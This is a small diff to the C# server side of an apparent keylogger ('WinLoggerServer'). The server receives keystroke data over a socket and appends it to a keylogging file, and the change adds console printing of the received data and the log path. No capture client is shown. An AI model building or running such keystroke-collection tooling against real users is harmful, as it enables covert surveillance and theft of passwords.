@@ -50,15 +50,16 @@ public class WinLoggerServer {
                 while (true) {  
                     bytes = new byte[1024];  
                     int bytesRec = handler.Receive(bytes);  
-                    data += Encoding.ASCII.GetString(bytes,0,bytesRec);  
+                    data += Encoding.ASCII.GetString(bytes,0,bytesRec);
+                    Console.WriteLine(data);
                     if (data.IndexOf("<EOF>") > -1) {  
                         break;  
                     }  
                 }  
 
                 // Append text to the keylogging file.
+                Console.WriteLine("Received some keys. Appended to '{0}'.", Globals.logfp);
                 File.AppendAllText(Globals.logfp, data + Environment.NewLine); 
-                Console.WriteLine("Received some keys. Appended to log file.");
  
                 handler.Shutdown(SocketShutdown.Both);  
                 handler.Close();  
